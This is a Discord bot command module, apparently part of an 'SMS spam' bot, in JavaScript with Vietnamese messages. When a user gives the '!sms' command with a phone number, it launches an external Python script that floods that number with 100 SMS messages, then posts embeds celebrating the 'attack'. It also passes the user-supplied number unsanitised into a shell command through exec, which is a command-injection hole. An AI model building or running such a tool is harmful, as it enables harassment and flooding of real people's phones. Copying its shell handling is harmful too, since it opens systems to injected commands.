const Discord = require("discord.js");
exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex !sms 0xxxxxxxxx`")
	.setFooter("Spam Tối Đa 100 Nhé :))")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`python sms.py ${host} 100`, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Cuộc tấn công đã ngăn chặn Username Discord:' +  message.author.username)

    const embed = new Discord.MessageEmbed()
    .setColor('RANDOM')
    .setTitle('🔥 **ĐÃ SPAM THÀNH CÔNG TẤT CẢ !** 🔥' +  message.author.username)
    .setTimestamp()
    .setDescription("**► STOP**")
  .setFooter(message.author.username)
    .setTimestamp()
    .setThumbnail("")
 message.channel.send(embed);
 }, 200000); //time in milliseconds
var gifler = ["https://i.pinimg.com/originals/10/b5/30/10b530edd7f18163bf28c100aff5aabb.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Bắt Đầu Tấn Công Username Discord:' +  message.author.username)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
     .setTitle('🌸🌸**Crows sms v1**🌸🌸')
    .setDescription("**𝐓𝐚𝐫𝐠𝐞𝐭 :**  `" + host + "` \n **𝐀𝐦𝐨𝐮𝐧𝐭 : **  `100` \n **𝐒𝐞𝐯𝐞𝐫 :**  `SPAM SMS !`")	
	.setFooter('Người  Dùng:' + message.author.username)
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['sms'],
  permLevel: 0
}

exports.help = {
  name: 'sms',
  description: 'ATTACK',
  usage: 'sms'
}
